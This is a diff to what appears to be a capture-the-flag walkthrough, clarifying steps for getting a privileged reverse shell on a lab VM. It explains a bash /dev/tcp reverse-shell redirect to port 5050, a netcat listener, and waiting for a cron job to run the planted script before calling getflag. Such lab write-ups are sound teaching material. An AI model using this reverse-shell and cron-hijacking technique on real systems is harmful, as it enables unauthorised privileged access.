@@ -13,8 +13,8 @@
 	- `>& /dev/tcp/0.0.0.0/5050` == redirects all outputs to a TCP connection<br>
 	- `0>&1` == redirects stdin to stdout, important to be able to input commands AND bypass ulimit -t 5<br>
 
-8.	SSH connect to VM with another terminal, netcat on specified port 
+8.	SSH connect to VM with another terminal, netcat on specified port (5050 in this case)
 
-9.	wait for cron schedule to execute and open a reverse shell
+9.	wait for cron schedule to execute and open a reverse shell (MUST WAIT FOR CRON SCHEDULE TO EXECUTE OUR SCRIPT TO HAVE PRIVILEGES INSIDE REVERSE SHELL)
 
 10.	use getflag inside the reverse shell
